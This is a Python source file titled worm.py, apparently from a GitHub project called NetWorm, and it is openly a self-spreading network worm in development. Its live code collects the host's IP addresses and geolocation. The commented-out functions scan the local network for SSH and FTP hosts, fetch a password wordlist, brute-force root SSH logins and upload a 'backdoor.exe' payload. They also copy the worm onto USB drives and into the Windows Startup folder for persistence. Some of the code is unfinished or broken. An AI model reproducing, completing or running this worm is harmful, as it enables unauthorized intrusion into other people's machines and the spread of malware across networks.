####################################
# File name: worm.py               #
# Author: Filip Komárek   (pylyf)  #
# Status: Development              #
# Date created: 7/6/2018           #
########################################################
# https://github.com/pylyf/NetWorm/blob/master/worm.py #
########################################################
import nmap
import os
import socket
from sys import version
try:
    from urllib2 import urlopen  
except ImportError:
    from urllib.request import urlopen
import urllib
import time
from ftplib import FTP
import ftplib
from shutil import copy2
#import win32api

def get_private_ip():
    """
    Gets private IP address of this machine.
    This will be used for scanning other computers on LAN.
    Returns:
        private IP address
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
    
def get_public_ip():
    """
    Gets public IP address of this network.
    You can access the router with this ip too.
    Returns:
        public IP address
    """
    import re
    data = str(urlopen('http://checkip.dyndns.com/').read())
    return re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)

def get_gps():
    import geocoder
    g = geocoder.ip('me')
    return g.latlng


def get_ipinfo():
    import requests
    req = requests.get("https://ipinfo.io")
    return req.json()
        
# def scan_ssh_hosts():
#     """
#     Scans all machines on the same network that
#      have SSH (port 22) enabled
#     Returns:
#         IP addresses of hosts
#     """

#     port_scanner = nmap.PortScanner()
#     port_scanner.scan('192.168.1.0/24', arguments='-p 22 --open')
#     all_hosts = port_scanner.all_hosts()

#     return all_hosts


# def scan_ftp_hosts():
#     """
#     Scans all machines on the same network that
#      have FTP (port 21) enabled
#     Returns:
#         IP addresses of hosts
#     """

#     port_scanner = nmap.PortScanner()
#     port_scanner.scan('192.168.1.0/24', arguments='-p 21 --open')
#     all_hosts = port_scanner.all_hosts()

#     return all_hosts


# def download_ssh_passwords(filename):
#     """
#      Downloads most commonly used ssh passwords from a specific url
#       Clearly, you can store passwords in a dictionary, but i found this more comfortable
#     Args:
#         filename - Name to save the file as.
#     """

#     # TODO:130 This wordlist contains only few passwords. You would need a bigger one for real bruteforcing. \_(OwO)_/

#     url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
#     urllib.request.urlretrieve(url, filename)


# def connect_to_ftp(host, username, password):
#     # TODO:30 : Finish this function + Add bruteforcing
#     try:
#         ftp = FTP(host)
#         ftp.login(username, password)
#     except ftplib.all_errors as error:
#         pass


# def connect_to_ssh(host, password):
#     """
#     Tries to connect to a SSH server
#     Returns:
#         True - Connection successful
#         False - Something went wrong
#     Args:
#         host - Target machine's IP
#         password - Password to use
#     """

#     # TODO:120 Pass usernames to the function too

#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#     try:
#         client.connect(host, 22, "root", password)

#         sftp = s.open_sftp()
#         sftp.put('backdoor.exe', "destination") # change this.

#         return True
#     except socket.error:
#         return False
#     except paramiko.ssh_exception.AuthenticationException:
#         return False
#     except paramiko.ssh_exception.SSHException:
#         # socket is open, but not SSH service responded
#         return False


# def bruteforce_ssh(host, wordlist):
#     """
#     Calls connect_to_ssh function and
#     tries to bruteforce the target server.
#     Args:
#         wordlist - TXT file with passwords
#     """
#     # TODO:10 : Bruteforce usernames too
#     file = open(wordlist, "r")
#     for line in file:
#         connection = connect_to_ssh(host, line)
#         print(connection)
#         time.sleep(5)


# def usbspreading():
#     # TODO:50 : Make this threaded.
#     bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

#     while True:
#         drives = win32api.GetLogicalDriveStrings()
#         drives = drives.split('\000')[:-1]
#         print(drives)
#         for drive in drives:
#             if "C:\\" == drive:
#                 copy2(__file__, bootfolder)
#             else:
#                 copy2(__file__, drive)
#         time.sleep(3)

# def main():
#     download_ssh_passwords("passwords.txt")
#     for host in scan_ssh_hosts():
#         bruteforce_ssh(host, "passwords.txt")


# if __name__ == "__main__":
#     main()